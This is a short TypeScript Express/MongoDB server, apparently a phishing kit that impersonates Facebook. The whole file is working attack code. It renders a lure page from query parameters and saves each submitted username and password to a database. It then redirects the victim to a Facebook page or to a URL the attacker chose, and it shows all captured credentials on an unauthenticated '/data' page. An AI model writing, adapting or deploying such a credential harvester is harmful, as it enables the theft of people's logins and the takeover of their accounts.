import "dotenv/config";
import * as express from "express";
import * as mongoose from "mongoose";
import * as path from "path";

import data from "./models/Data";

const app = express();
let dynamicUrl: string;

app
  .set("view engine", "ejs")
  .set("views", path.join(`${__dirname}/views`))
  .use(express.json())
  .use(express.urlencoded({ extended: false }))
  .get("/", function(request, response) {
    const { header, image, url } = request.query;

    if (header && image) {
      dynamicUrl = url;
      response.render("index", { header, image });
      return;
    }

    response.redirect("https://facebook.com");
  })
  .post("/data", async function(request, response) {
    const { user, password } = request.body;

    await data.create({ user, password });

    response.redirect(
      dynamicUrl
        ? dynamicUrl
        : "https://newsfeed.fb.com/welcome-to-news-feed?lang=en"
    );
  })
  .get("/data", async function(_, response) {
    const users = await data.find();
    response.render("data", { users });
  })
  .get("/data/:id", async function(request, response) {
    const id = request.params.id;

    await data.findOneAndDelete({ _id: id });

    response.redirect("/data");
  });

mongoose
  .connect(
    process.env.MONGO_URL as any,
    { useNewUrlParser: true }
  )
  .then(() => app.listen(process.env.PORT || 3000));
